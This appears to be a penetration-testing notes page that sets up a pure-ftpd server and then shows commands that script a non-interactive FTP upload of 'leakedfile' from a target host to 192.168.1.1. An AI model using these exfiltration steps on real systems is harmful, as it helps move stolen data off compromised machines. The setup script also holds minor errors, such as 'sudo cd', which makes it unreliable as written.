---
description: FTP usage is in non-interactive shells.
---

# FTP

**setup-ftp.sh**

```
#!/bin/bash

sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
sudo pure-pw useradd cel1s0 -u ftpuser -d /ftphome
sudo pure-pw mkdb
sudo cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
```

```
$ sudo systemctl start pure-ftpd.service
```

```
echo open 192.168.1.1 21 > ftp.txt
echo USER cel1s0 >> ftp.txt
echo ftppass >> ftp.txt
echo bin >> ftp.txt
echo PUT leakedfile >> ftp.txt
echo bye >> ftp.txt

> ftp -v -n -s:ftp.txt
```

You can see the file at **/ftphome** dir.
